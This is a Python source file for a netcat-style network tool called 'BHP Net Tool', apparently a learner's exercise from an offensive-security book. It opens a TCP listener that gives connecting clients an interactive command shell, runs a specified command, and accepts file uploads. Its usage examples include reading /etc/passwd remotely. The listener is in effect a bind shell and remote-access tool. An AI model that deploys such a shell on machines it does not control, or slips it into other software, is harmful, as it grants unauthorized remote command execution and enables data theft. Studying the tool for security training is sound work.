import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading
def execute(cmd): 
    cmd = cmd.strip() 
    if not cmd: 
        return 
    #capture the output and error both 
    #output = subprocess.check_output(shlex.split(cmd),stderr=subprocess.STDOUT)
    output = subprocess.check_output(shlex.split(cmd),stderr=subprocess.STDOUT,shell=True) 
    return output.decode()
class NetCat: 
  def __init__(self, args, buffer=None): 
        self.args = args 
        self.buffer = buffer 
        #tcp
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #maybe tcp or udp and its reusable address
  def send(self): 
     #sender is trying to connect
     self.socket.connect((self.args.target, self.args.port)) #tcp
     if self.buffer: 
        self.socket.send(self.buffer) #if some buffer already exists we send it
     try: 
        while True: 
                recv_len = 1 
                response = '' 
                while recv_len: 
                    data = self.socket.recv(4096) #try to recieve the data recieving from the server(listeener)
                    recv_len = len(data) 
                    response += data.decode() 
                    if recv_len < 4096: 
                                     break 
                if response: 
                    print(response) 
                    buffer = input('> ') 
                    buffer += '\n'      #we are sending our input we write in client side to listener 
                    self.socket.send(buffer.encode()) 
     except KeyboardInterrupt: 
            print('User terminated.') 
            self.socket.close() 
            sys.exit() 
  def handle(self, client_socket): 
    if self.args.execute: 
            output = execute(self.args.execute) #runs in terminal and store it in output variable
            client_socket.send(output.encode()) #sending the output
    elif self.args.upload: 
            file_buffer = b'' 
            while True: 
                data = client_socket.recv(4096)#receive data from client socket 
                if data: 
                    file_buffer += data 
                else: 
                    break
            with open(self.args.upload,'wb') as f:  #self.args.upload->filename.txt wb->write binary
                 f.write(file_buffer)  #we write it in the file
            message=f'Saved file {self.args.upload}' #confirmation message
            client_socket.send(message.encode())
    elif self.args.command: 
            cmd_buffer = b'' 
            while True: 
                try: 
                    client_socket.send(b'BHP: #> ') #sending to client 
                    while '\n' not in cmd_buffer.decode(): 
                        cmd_buffer += client_socket.recv(64)  #receiving the command from client 
                    response = execute(cmd_buffer.decode()) #storing the output in response
                    if response: 
                        client_socket.send(response.encode()) #sending from client
                    cmd_buffer = b'' 
                except Exception as e: 
                    print(f'server killed {e}') 
                    self.socket.close() 
                    sys.exit()  
  def listen(self): 
    self.socket.bind((self.args.target, self.args.port)) #server
    self.socket.listen(5) #limiting to 5 connections
    while True: 
        client_socket, _ = self.socket.accept() 
        client_thread = threading.Thread(target=self.handle, args=(client_socket,)) # listener thread
        client_thread.start()   
  def run(self): 
        if self.args.listen: #listener    
         self.listen() 
        else:  #sender
         self.send()
if __name__=='__main__':
  parser=argparse.ArgumentParser(description='BHP Net Tool',formatter_class=argparse.RawDescriptionHelpFormatter,epilog=textwrap.dedent('''
                                                Example:netcat.py -t 192.68.1.108 -p 5555 -l -c #command shell
                                                        netcat.py -t 192.68.1.108 -p 5555 -l -u=mytest.txt  # upload to file  
                                                        netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat/etc/passwd\" #execute command
                                                        echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 #echo test to server port 15
                                                         netcat.py -t 192.168.1.108 -p 5555 # connect to server '''))
  parser.add_argument('-c','--command',action='store_true',help='command shell')
  parser.add_argument('-e', '--execute', help='execute specified command')
  parser.add_argument('-l', '--listen', action='store_true', help='listen')
  parser.add_argument('-p', '--port', type=int, default=5555, help='specified port') 
  parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
  parser.add_argument('-u', '--upload', help='upload file')
  #c,e,u listener side           c->recieving command u->upload
  # t p sender side              t->rarget  
  args = parser.parse_args() 
  #listening mode
  if args.listen:
      buffer = ''
  else: #sender mode
      buffer = sys.stdin.read() 
  nc = NetCat(args, buffer.encode())     
  nc.run()    
